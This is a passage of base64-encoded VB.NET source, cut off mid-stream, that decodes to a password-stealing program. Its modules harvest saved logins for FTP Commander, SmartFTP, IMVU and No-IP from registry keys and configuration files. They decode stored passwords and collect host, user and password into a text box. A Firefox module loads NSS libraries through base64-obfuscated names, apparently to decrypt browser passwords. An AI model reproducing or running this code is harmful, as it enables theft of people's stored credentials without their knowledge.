mlsZShCeVZhbCBzRmlsZSBBcyBTdHJpbmcpIEFzIFN0cmluZw0KICAgICAgICBPbiBFcnJvciBSZXN1bWUgTmV4dA0KICAgICAgICBEaW0gT3BlbkZpbGUgQXMgTmV3IFN5c3RlbS5JTy5TdHJlYW1SZWFkZXIoc0ZpbGUpDQogICAgICAgIFJlYWRGaWxlID0gT3BlbkZpbGUuUmVhZFRvRW5kLlRvU3RyaW5nDQogICAgRW5kIEZ1bmN0aW9uDQogICAgRnVuY3Rpb24gQ3V0KEJ5VmFsIHNJbmhhbHQgQXMgU3RyaW5nLCBCeVZhbCBzVGV4dCBBcyBTdHJpbmcsIEJ5VmFsIHN0ZXh0MiBBcyBTdHJpbmcpIEFzIFN0cmluZw0KICAgICAgICBPbiBFcnJvciBSZXN1bWUgTmV4dA0KICAgICAgICBEaW0gYygpIEFzIFN0cmluZw0KICAgICAgICBEaW0gYzIoKSBBcyBTdHJpbmcNCiAgICAgICAgYyA9IFNwbGl0KHNJbmhhbHQsIHNUZXh0KQ0KICAgICAgICBjMiA9IFNwbGl0KGMoMSksIHN0ZXh0MikNCiAgICAgICAgQ3V0ID0gYzIoMCkNCiAgICBFbmQgRnVuY3Rpb24NCiAgICBGdW5jdGlvbiBSZWdSZWFkKEJ5VmFsIGhLZXkgQXMgU3RyaW5nKSBBcyBTdHJpbmcNCiAgICAgICAgRGltIHdzaFNoZWxsIEFzIE9iamVjdCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQogICAgICAgIE9uIEVycm9yIFJlc3VtZSBOZXh0DQogICAgICAgIFJlZ1JlYWQgPSB3c2hTaGVsbC5SZWdSZWFkKGhLZXkpDQogICAgRW5kIEZ1bmN0aW9uDQogICAgUHVibGljIEZ1bmN0aW9uIFJlYWRMaW5lKEJ5VmFsIGZpbGVuYW1lIEFzIFN0cmluZywgXw0KICAgIEJ5VmFsIGxpbmUgQXMgSW50ZWdlcikgQXMgU3RyaW5nDQogICAgICAgIFRyeQ0KICAgICAgICAgICAgRGltIGxpbmVzIEFzIFN0cmluZygpID0gTXkuQ29tcHV0ZXIuRmlsZVN5c3RlbS5SZWFkQWxsVGV4dCggXw0KICAgICAgICAgICAgICBmaWxlbmFtZSwgU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdCkuU3BsaXQodmJDckxmKQ0KICAgICAgICAgICAgSWYgbGluZSA+IDAgVGhlbg0KICAgICAgICAgICAgICAgIFJldHVybiBsaW5lcyhsaW5lIC0gMSkNCiAgICAgICAgICAgIEVsc2VJZiBsaW5lIDwgMCBUaGVuDQogICAgICAgICAgICAgICAgUmV0dXJuIGxpbmVzKGxpbmVzLkxlbmd0aCArIGxpbmUgLSAxKQ0KICAgICAgICAgICAgRWxzZQ0KICAgICAgICAgICAgICAgIFJldHVybiAiIg0KICAgICAgICAgICAgRW5kIElmDQogICAgICAgIENhdGNoIGV4IEFzIEV4Y2VwdGlvbg0KICAgICAgICAgICAgUmV0dXJuICIiDQogICAgICAgIEVuZCBUcnkNCiAgICBFbmQgRnVuY3Rpb24NCkVuZCBNb2R1bGUNCg0KTW9kdWxlIEZUUENvbW1hbmRlcg0KICAgIEZ1bmN0aW9uIEZ0cENvbW1hbmRlcigpIEFzIFN0cmluZw0KICAgICAgICBEaW0gc1BhdGggQXMgU3RyaW5nID0gUmVwbGFjZShSZWdSZWFkKCJIS0VZX0xPQ0FMX01BQ0hJTkVcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXEZUUCBDb21tYW5kZXJcVW5pbnN0YWxsU3RyaW5nIiksICJ1bmluc3RhbGwuZXhlIiwgdmJOdWxsU3RyaW5nKSAmICJGdHBsaXN0LnR4dCINCiAgICAgICAgRGltIHNGaWxlIEFzIFN0cmluZyA9IFJlYWRMaW5lKHNQYXRoLCAtMSkNCiAgICAgICAgRGltIHNIb3N0IEFzIFN0cmluZyA9IEN1dChzRmlsZSwgIjtTZXJ2ZXI9IiwgIjtQb3J0PSIpDQogICAgICAgIERpbSBzUG9ydCBBcyBTdHJpbmcgPSBDdXQoc0ZpbGUsICI7UG9ydD0iLCAiO1Bhc3N3b3JkPSIpDQogICAgICAgIERpbSBzVXNlciBBcyBTdHJpbmcgPSBDdXQoc0ZpbGUsICI7VXNlcj0iLCAiO0Fub255bW91cz0iKQ0KICAgICAgICBEaW0gc1B3ZCBBcyBTdHJpbmcgPSBDdXQoc0ZpbGUsICI7UGFzc3dvcmQ9IiwgIjtVc2VyPSIpDQogICAgICAgIERpbSBzRW50cnkgQXMgU3RyaW5nID0gQ3V0KHNGaWxlLCAiTmFtZT0iLCAiO1NlcnZlcj0iKQ0KDQogICAgICAgIElmIE5vdCBzVXNlciA9ICIiIFRoZW4NCiAgICAgICAgICAgIFRyeQ0KICAgICAgICAgICAgICAgIEZ0cENvbW1hbmRlciA9ICJFbnRyeTogIiArIHNFbnRyeSArIHZiTmV3TGluZSArICJIb3N0OiAiICsgc0hvc3QgKyAiOiIgKyBzUG9ydCArIHZiTmV3TGluZSArICJVc2VyOiAiICsgc1VzZXIgKyB2Yk5ld0xpbmUgKyAiUHdkOiAiICsgc1B3ZA0KICAgICAgICAgICAgICAgIERpbSBubCBBcyBTdHJpbmcgPSB2Yk5ld0xpbmUNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dChubCkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgifn5+fn5GVFAgQ29tbWFuZGVyfn5+fn4iKQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJFbnRyeTogIiAmIHNFbnRyeSkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dChubCkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgiSG9zdDogIiAmIHNIb3N0KQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCI6ICIgJiBzUG9ydCkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dChubCkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgiVXNlcjogIiAmIHNVc2VyKQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJQYXNzd29yZDogIiAmIHNQd2QpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIn5+fn5+fn5+fn4iKQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAgICAgICAgQ2F0Y2ggZXggQXMgRXhjZXB0aW9uDQogICAgICAgICAgICBFbmQgVHJ5DQogICAgICAgIEVsc2UNCiAgICAgICAgRW5kIElmDQogICAgICAgIFJldHVybiBOb3RoaW5nDQogICAgRW5kIEZ1bmN0aW9uDQogICAgRnVuY3Rpb24gUmVhZEZpbGUoQnlWYWwgc0ZpbGUgQXMgU3RyaW5nKSBBcyBTdHJpbmcNCiAgICAgICAgT24gRXJyb3IgUmVzdW1lIE5leHQNCiAgICAgICAgRGltIE9wZW5GaWxlIEFzIE5ldyBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKHNGaWxlKQ0KICAgICAgICBSZWFkRmlsZSA9IE9wZW5GaWxlLlJlYWRUb0VuZC5Ub1N0cmluZw0KICAgIEVuZCBGdW5jdGlvbg0KICAgIEZ1bmN0aW9uIEN1dChCeVZhbCBzSW5oYWx0IEFzIFN0cmluZywgQnlWYWwgc1RleHQgQXMgU3RyaW5nLCBCeVZhbCBzdGV4dDIgQXMgU3RyaW5nKSBBcyBTdHJpbmcNCiAgICAgICAgT24gRXJyb3IgUmVzdW1lIE5leHQNCiAgICAgICAgRGltIGMoKSBBcyBTdHJpbmcNCiAgICAgICAgRGltIGMyKCkgQXMgU3RyaW5nDQogICAgICAgIGMgPSBTcGxpdChzSW5oYWx0LCBzVGV4dCkNCiAgICAgICAgYzIgPSBTcGxpdChjKDEpLCBzdGV4dDIpDQogICAgICAgIEN1dCA9IGMyKDApDQogICAgRW5kIEZ1bmN0aW9uDQogICAgRnVuY3Rpb24gUmVnUmVhZChCeVZhbCBoS2V5IEFzIFN0cmluZykgQXMgU3RyaW5nDQogICAgICAgIERpbSB3c2hTaGVsbCBBcyBPYmplY3QgPSBDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0KICAgICAgICBPbiBFcnJvciBSZXN1bWUgTmV4dA0KICAgICAgICBSZWdSZWFkID0gd3NoU2hlbGwuUmVnUmVhZChoS2V5KQ0KICAgIEVuZCBGdW5jdGlvbg0KICAgIFB1YmxpYyBGdW5jdGlvbiBSZWFkTGluZShCeVZhbCBmaWxlbmFtZSBBcyBTdHJpbmcsIF8NCiAgICBCeVZhbCBsaW5lIEFzIEludGVnZXIpIEFzIFN0cmluZw0KICAgICAgICBUcnkNCiAgICAgICAgICAgIERpbSBsaW5lcyBBcyBTdHJpbmcoKSA9IE15LkNvbXB1dGVyLkZpbGVTeXN0ZW0uUmVhZEFsbFRleHQoIF8NCiAgICAgICAgICAgICAgZmlsZW5hbWUsIFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQpLlNwbGl0KHZiQ3JMZikNCiAgICAgICAgICAgIElmIGxpbmUgPiAwIFRoZW4NCiAgICAgICAgICAgICAgICBSZXR1cm4gbGluZXMobGluZSAtIDEpDQogICAgICAgICAgICBFbHNlSWYgbGluZSA8IDAgVGhlbg0KICAgICAgICAgICAgICAgIFJldHVybiBsaW5lcyhsaW5lcy5MZW5ndGggKyBsaW5lIC0gMSkNCiAgICAgICAgICAgIEVsc2UNCiAgICAgICAgICAgICAgICBSZXR1cm4gIiINCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBDYXRjaCBleCBBcyBFeGNlcHRpb24NCiAgICAgICAgICAgIFJldHVybiAiIg0KICAgICAgICBFbmQgVHJ5DQogICAgRW5kIEZ1bmN0aW9uDQpFbmQgTW9kdWxlDQpNb2R1bGUgSW12dQ0KICAgIEZ1bmN0aW9uIFJlYWRLZXkoQnlSZWYgaEtleSBBcyBTdHJpbmcpIEFzIE9iamVjdCAnIC8vIEZ1bmN0aW9uIGZvciBSZWFkIFJFRyBWYWx1ZXMNCiAgICAgICAgT24gRXJyb3IgR29UbyBFcnJvcl9SZW5hbWVkICcgLy8gSWYgRXJyb3IgZG9udCBEaXNwbGF5IEVycm9yDQogICAgICAgIERpbSBYIEFzIE9iamVjdCAnIC8vDQogICAgICAgIFggPSBDcmVhdGVPYmplY3QoIldTY3JpcHQuc2hlbGwiKSAnIC8vIENyZWF0ZSBSRUcgT2JqZWN0DQogICAgICAgIFJlYWRLZXkgPSBYLnJlZ3JlYWQoaEtleSkgJyAvLyBSZWFkIFRoZSBLZXkNCiAgICAgICAgRXhpdCBGdW5jdGlvbg0KRXJyb3JfUmVuYW1lZDogUmVhZEtleSA9IHZiTnVsbFN0cmluZyAnIC8vIElmIEVycm9yIFJlYWRrZXkgPSAiIg0KICAgIEVuZCBGdW5jdGlvbg0KICAgIFB1YmxpYyBGdW5jdGlvbiBIZXgyQXNjaWkoQnlWYWwgVGV4dCBBcyBTdHJpbmcpIEFzIFN0cmluZw0KICAgICAgICBEaW0gVmFsdWUgQXMgT2JqZWN0DQogICAgICAgIERpbSBudW0gQXMgT2JqZWN0DQogICAgICAgIERpbSBpIEFzIE9iamVjdCAnIC8vIFNpbXBsZSBGdW5jdGlvbiBmb3IgUGFzcyBIZXggdG8gQXNjaWkNCiAgICAgICAgVmFsdWUgPSBOb3RoaW5nDQogICAgICAgIEZvciBpICA9IDEgVG8gTGVuKFRleHQpICcgTGVuIG9mIEVuY3JpcHRlZCBUZXh0DQogICAgICAgICAgICBudW0gPSBNaWQoVGV4dCwgaSwgMikgJyAvLyBHbyBDaHIgYnkgQ2hyDQogICAgICAgICAgICBWYWx1ZSA9IFZhbHVlICYgQ2hyKFZhbCgiJmgiICYgbnVtKSkgJyAvLyBQYXNzIGZyb20gSGV4DQogICAgICAgICAgICBpID0gaSArIDEgJyAvLyArMQ0KICAgICAgICBOZXh0IGkgJyBOZXh0IENocg0KDQogICAgICAgIEhleDJBc2NpaSA9IFZhbHVlICcgLy8NCiAgICBFbmQgRnVuY3Rpb24NCiAgICBQdWJsaWMgRnVuY3Rpb24gRG9Ub1Z1KCkgQXMgU3RyaW5nDQogICAgICAgIERpbSBzVXNlciwgc1Bhc3MgQXMgU3RyaW5nICcgLy8gU29tZSBWYXJpYWJsZXMNCiAgICAgICAgc1VzZXIgPSAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcSU1WVVx1c2VybmFtZVwiICcgLy8gVXNlcm5hbWUgUkVHIFBhdGgNCiAgICAgICAgc1Bhc3MgPSAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcSU1WVVxwYXNzd29yZFwiICcgLy8gUGFzc3dvcmQgUkVHIFBhdGgNCiAgICAgICAgRGltIG5sIEFzIFN0cmluZyA9IHZiTmV3TGluZQ0KICAgICAgICBJZiBSZWFkS2V5KHNVc2VyKSA8PiAiIiBUaGVuDQoNCg0KICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgifn5+fn5JTVZVfn5+fn4iKQ0KICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgiVXNlcm5hbWU6ICIgJiBSZWFkS2V5KHNVc2VyKSkNCiAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIlBhc3N3b3JkOiAiICYgSGV4MkFzY2lpKFJlYWRLZXkoc1Bhc3MpKSkNCiAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIn5+fn5+fn5+fn4iKQ0KICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgIEVuZCBJZg0KICAgICAgICBSZXR1cm4gTm90aGluZw0KICAgICAgICBFeGl0IEZ1bmN0aW9uDQogICAgRW5kIEZ1bmN0aW9uDQpFbmQgTW9kdWxlDQpNb2R1bGUgTm9fSVANCiAgICBQdWJsaWMgRnVuY3Rpb24gYmFzZTY0RGVjb2RlKEJ5VmFsIGRhdGEgQXMgU3RyaW5nKSBBcyBTdHJpbmcNCiAgICAgICAgVHJ5DQogICAgICAgICAgICBEaW0gZW5jb2RlciBBcyBOZXcgU3lzdGVtLlRleHQuVVRGOEVuY29kaW5nKCkNCiAgICAgICAgICAgIERpbSB1dGY4RGVjb2RlIEFzIFN5c3RlbS5UZXh0LkRlY29kZXIgPSBlbmNvZGVyLkdldERlY29kZXIoKQ0KICAgICAgICAgICAgRGltIHRvZGVjb2RlX2J5dGUgQXMgQnl0ZSgpID0gQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKERhdGEpDQogICAgICAgICAgICBEaW0gY2hhckNvdW50IEFzIEludGVnZXIgPSB1dGY4RGVjb2RlLkdldENoYXJDb3VudCh0b2RlY29kZV9ieXRlLCAwLCB0b2RlY29kZV9ieXRlLkxlbmd0aCkNCiAgICAgICAgICAgIERpbSBkZWNvZGVkX2NoYXIgQXMgQ2hhcigpID0gTmV3IENoYXIoY2hhckNvdW50IC0gMSkge30NCiAgICAgICAgICAgIHV0ZjhEZWNvZGUuR2V0Q2hhcnModG9kZWNvZGVfYnl0ZSwgMCwgdG9kZWNvZGVfYnl0ZS5MZW5ndGgsIGRlY29kZWRfY2hhciwgMCkNCiAgICAgICAgICAgIERpbSByZXN1bHQgQXMgU3RyaW5nID0gTmV3IFtTdHJpbmddKGRlY29kZWRfY2hhcikNCiAgICAgICAgICAgIFJldHVybiByZXN1bHQNCiAgICAgICAgQ2F0Y2ggZSBBcyBFeGNlcHRpb24NCiAgICAgICAgRW5kIFRyeQ0KICAgICAgICBSZXR1cm4gTm90aGluZw0KICAgIEVuZCBGdW5jdGlvbg0KICAgIEZ1bmN0aW9uIElwUmVjb3JkKCkgQXMgU3RyaW5nDQogICAgICAgIFRyeQ0KICAgICAgICAgICAgSXBSZWNvcmQgPSBOb3RoaW5nDQogICAgICAgICAgICBEaW0gVXNlcm5hbWUgQXMgU3RyaW5nID0gTXkuQ29tcHV0ZXIuUmVnaXN0cnkuR2V0VmFsdWUoIkhLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxWaXRhbHdlcmtzXERVQyIsICJVc2VybmFtZSIsIE5vdGhpbmcpDQogICAgICAgICAgICBEaW0gUGFzc3dvcmQgQXMgU3RyaW5nID0gTXkuQ29tcHV0ZXIuUmVnaXN0cnkuR2V0VmFsdWUoIkhLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxWaXRhbHdlcmtzXERVQyIsICJQYXNzd29yZCIsIE5vdGhpbmcpDQogICAgICAgICAgICBEaW0gbmwgQXMgU3RyaW5nID0gdmJOZXdMaW5lDQoNCiAgICAgICAgICAgIElmIFVzZXJuYW1lIDw+ICIiIFRoZW4NCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dChubCkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgifn5+fn5Oby1JUH5+fn5+IikNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dChubCkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgiVXNlcm5hbWU6ICIgJiBVc2VybmFtZSkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dChubCkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgiUGFzc3dvcmQ6ICIgJiBiYXNlNjREZWNvZGUoUGFzc3dvcmQpKQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJ+fn5+fn5+fn5+IikNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dChubCkNCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBDYXRjaCBleCBBcyBFeGNlcHRpb24NCg0KICAgICAgICBFbmQgVHJ5DQoNCiAgICAgICAgUmV0dXJuIE5vdGhpbmcNCiAgICBFbmQgRnVuY3Rpb24NCg0KRW5kIE1vZHVsZQ0KTW9kdWxlIFNtYXJ0RlRQDQogICAgRnVuY3Rpb24gU21hcnRGVFAoKSBBcyBTdHJpbmcNCiAgICAgICAgRGltIHNQYXRoIEFzIFN0cmluZyA9IEVudmlyb24kKCJBUFBEQVRBIikgJiAiXFNtYXJ0RlRQXENsaWVudCAyLjBcRmF2b3JpdGVzXFF1aWNrIENvbm5lY3RcIiAmIERpcihFbnZpcm9uJCgiQVBQREFUQSIpICYgIlxTbWFydEZUUFxDbGllbnQgMi4wXEZhdm9yaXRlc1xRdWljayBDb25uZWN0XCoueG1sIikNCiAgICAgICAgRGltIHNGaWxlIEFzIFN0cmluZyA9IFJlYWRGaWxlKHNQYXRoKQ0KICAgICAgICBEaW0gc0hvc3QgQXMgU3RyaW5nID0gQ3V0KHNGaWxlLCAiPEhvc3Q+IiwgIjwvSG9zdD4iKQ0KICAgICAgICBEaW0gc1BvcnQgQXMgU3RyaW5nID0gQ3V0KHNGaWxlLCAiPFBvcnQ+IiwgIjwvUG9ydD4iKQ0KICAgICAgICBEaW0gc1VzZXIgQXMgU3RyaW5nID0gQ3V0KHNGaWxlLCAiPFVzZXI+IiwgIjwvVXNlcj4iKQ0KICAgICAgICBEaW0gc1B3ZCBBcyBTdHJpbmcgPSBDdXQoc0ZpbGUsICI8UGFzc3dvcmQ+IiwgIjwvUGFzc3dvcmQ+IikNCiAgICAgICAgRGltIHNFbnRyeSBBcyBTdHJpbmcgPSBDdXQoc0ZpbGUsICI8TmFtZT4iLCAiPC9OYW1lPiIpDQoNCiAgICAgICAgSWYgTm90IHNVc2VyID0gIiIgVGhlbg0KICAgICAgICAgICAgVHJ5DQogICAgICAgICAgICAgICAgU21hcnRGVFAgPSAiRW50cnk6ICIgKyBzRW50cnkgKyB2Yk5ld0xpbmUgKyAiSG9zdDogIiArIHNIb3N0ICsgIjoiICsgc1BvcnQgKyB2Yk5ld0xpbmUgKyAiVXNlcjogIiArIHNVc2VyICsgdmJOZXdMaW5lICsgIlBhc3N3b3JkOiAiICsgc1B3ZCArICIgKEVuY3J5cHQpIg0KICAgICAgICAgICAgICAgIERpbSBubCBBcyBTdHJpbmcgPSB2Yk5ld0xpbmUNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dChubCkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgifn5+fn5TbWFydEZUUH5+fn5+IikNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dChubCkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgiRW50cnk6ICIgJiBzRW50cnkpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIkhvc3Q6ICIgJiBzSG9zdCkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgiOiAiICYgc1BvcnQpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIlVzZXI6ICIgJiBzVXNlcikNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dChubCkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgiUGFzc3dvcmQ6ICIgJiBzUHdkKQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJ+fn5+fn5+fn5+IikNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dChubCkNCiAgICAgICAgICAgIENhdGNoIGV4IEFzIEV4Y2VwdGlvbg0KDQogICAgICAgICAgICBFbmQgVHJ5DQogICAgICAgIEVsc2UNCiAgICAgICAgRW5kIElmDQogICAgICAgIFJldHVybiBOb3RoaW5nDQogICAgRW5kIEZ1bmN0aW9uDQogICAgRnVuY3Rpb24gUmVhZEZpbGUoQnlWYWwgc0ZpbGUgQXMgU3RyaW5nKSBBcyBTdHJpbmcNCiAgICAgICAgT24gRXJyb3IgUmVzdW1lIE5leHQNCiAgICAgICAgRGltIE9wZW5GaWxlIEFzIE5ldyBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKHNGaWxlKQ0KICAgICAgICBSZWFkRmlsZSA9IE9wZW5GaWxlLlJlYWRUb0VuZC5Ub1N0cmluZw0KICAgIEVuZCBGdW5jdGlvbg0KICAgIEZ1bmN0aW9uIEN1dChCeVZhbCBzSW5oYWx0IEFzIFN0cmluZywgQnlWYWwgc1RleHQgQXMgU3RyaW5nLCBCeVZhbCBzdGV4dDIgQXMgU3RyaW5nKSBBcyBTdHJpbmcNCiAgICAgICAgT24gRXJyb3IgUmVzdW1lIE5leHQNCiAgICAgICAgRGltIGMoKSBBcyBTdHJpbmcNCiAgICAgICAgRGltIGMyKCkgQXMgU3RyaW5nDQogICAgICAgIGMgPSBTcGxpdChzSW5oYWx0LCBzVGV4dCkNCiAgICAgICAgYzIgPSBTcGxpdChjKDEpLCBzdGV4dDIpDQogICAgICAgIEN1dCA9IGMyKDApDQogICAgRW5kIEZ1bmN0aW9uDQogICAgRnVuY3Rpb24gUmVnUmVhZChCeVZhbCBoS2V5IEFzIFN0cmluZykgQXMgU3RyaW5nDQogICAgICAgIERpbSB3c2hTaGVsbCBBcyBPYmplY3QgPSBDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0KICAgICAgICBPbiBFcnJvciBSZXN1bWUgTmV4dA0KICAgICAgICBSZWdSZWFkID0gd3NoU2hlbGwuUmVnUmVhZChoS2V5KQ0KICAgIEVuZCBGdW5jdGlvbg0KICAgIFB1YmxpYyBGdW5jdGlvbiBSZWFkTGluZShCeVZhbCBmaWxlbmFtZSBBcyBTdHJpbmcsIF8NCiAgICBCeVZhbCBsaW5lIEFzIEludGVnZXIpIEFzIFN0cmluZw0KICAgICAgICBUcnkNCiAgICAgICAgICAgIERpbSBsaW5lcyBBcyBTdHJpbmcoKSA9IE15LkNvbXB1dGVyLkZpbGVTeXN0ZW0uUmVhZEFsbFRleHQoIF8NCiAgICAgICAgICAgICAgZmlsZW5hbWUsIFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQpLlNwbGl0KHZiQ3JMZikNCiAgICAgICAgICAgIElmIGxpbmUgPiAwIFRoZW4NCiAgICAgICAgICAgICAgICBSZXR1cm4gbGluZXMobGluZSAtIDEpDQogICAgICAgICAgICBFbHNlSWYgbGluZSA8IDAgVGhlbg0KICAgICAgICAgICAgICAgIFJldHVybiBsaW5lcyhsaW5lcy5MZW5ndGggKyBsaW5lIC0gMSkNCiAgICAgICAgICAgIEVsc2UNCiAgICAgICAgICAgICAgICBSZXR1cm4gIiINCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBDYXRjaCBleCBBcyBFeGNlcHRpb24NCiAgICAgICAgICAgIFJldHVybiAiIg0KICAgICAgICBFbmQgVHJ5DQogICAgRW5kIEZ1bmN0aW9uDQpFbmQgTW9kdWxlDQoNCk1vZHVsZSBJRUZVDQogICAgUHVibGljIENsYXNzIFNISVRFTUlEDQogICAgICAgIFB1YmxpYyBTaGFyZWQgY2IgQXMgTG9uZw0KICAgICAgICBQdWJsaWMgU2hhcmVkIGFiSUQgQXMgQnl0ZSgpDQogICAgRW5kIENsYXNzDQogICAgPFN0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpPiBfDQogICAgUHVibGljIFN0cnVjdHVyZSBUU0VDSXRlbQ0KICAgICAgICBQdWJsaWMgU0VDSXRlbVR5cGUgQXMgSW50ZWdlcg0KICAgICAgICBQdWJsaWMgU0VDSXRlbURhdGEgQXMgSW50ZWdlcg0KICAgICAgICBQdWJsaWMgU0VDSXRlbUxlbiBBcyBJbnRlZ2VyDQogICAgRW5kIFN0cnVjdHVyZQ0KDQogICAgPERsbEltcG9ydCgia2VybmVsMzIuZGxsIik+IF8NCiAgICBQcml2YXRlIEZ1bmN0aW9uIExvYWRMaWJyYXJ5KEJ5VmFsIGRsbEZpbGVQYXRoIEFzIFN0cmluZykgQXMgSW50UHRyDQogICAgRW5kIEZ1bmN0aW9uDQogICAgUHJpdmF0ZSBOU1MzIEFzIEludFB0cg0KICAgIDxEbGxJbXBvcnQoImtlcm5lbDMyIiwgQ2hhclNldDo9Q2hhclNldC5BbnNpLCBFeGFjdFNwZWxsaW5nOj1UcnVlLCBTZXRMYXN0RXJyb3I6PVRydWUpPiBfDQogICAgUHJpdmF0ZSBGdW5jdGlvbiBHZXRQcm9jQWRkcmVzcyhCeVZhbCBoTW9kdWxlIEFzIEludFB0ciwgQnlWYWwgcHJvY05hbWUgQXMgU3RyaW5nKSBBcyBJbnRQdHINCiAgICBFbmQgRnVuY3Rpb24NCiAgICA8VW5tYW5hZ2VkRnVuY3Rpb25Qb2ludGVyKENhbGxpbmdDb252ZW50aW9uLkNkZWNsKT4gXw0KICAgIFB1YmxpYyBEZWxlZ2F0ZSBGdW5jdGlvbiBETExGdW5jdGlvbkRlbGVnYXRlKEJ5VmFsIGNvbmZpZ2RpciBBcyBTdHJpbmcpIEFzIExvbmcNCiAgICBQdWJsaWMgRnVuY3Rpb24gTlNTX0luaXQoQnlWYWwgY29uZmlnZGlyIEFzIFN0cmluZykgQXMgTG9uZw0KICAgICAgICBEaW0gWzEwOF0gQXMgU3RyaW5nID0gRW52aXJvbm1lbnQuR2V0RW52aXJvbm1lbnRWYXJpYWJsZSgiUFJPR1JBTUZJTEVTIikgJiAiXCIgJiBbMjRdLls0Ml0oIlRXOTZhV3hzWVE9PSIpICYgIiAiICYgWzI0XS5bNDJdKCJSbWx5WldadmVBPT0iKSAmICJcIg0KICAgICAgICBMb2FkTGlicmFyeShbMTA4XSAmIFsyNF0uWzQyXSgiYlc5NlkzSjBNVGt1Wkd4cyIpKQ0KICAgICAgICBMb2FkTGlicmFyeShbMTA4XSAmIFsyNF0uWzQyXSgiYm5Od2NqUXVaR3hzIikpDQogICAgICAgIExvYWRMaWJyYXJ5KFsxMDhdICYgWzI0XS5bNDJdKCJjR3hqTkM1a2JHdz0iKSkNCiAgICAgICAgTG9hZExpYnJhcnkoWzEwOF0gJiBbMjRdLls0Ml0oImNHeGtjelF1Wkd4cyIpKQ0KICAgICAgICBMb2FkTGlicmFyeShbMTA4XSAmIFsyNF0uWzQyXSgiYzNOMWRHbHNNeTVrYkd3PSIpKQ0KICAgICAgICBMb2FkTGlicmFyeShbMTA4XSAmIFsyNF0uWzQyX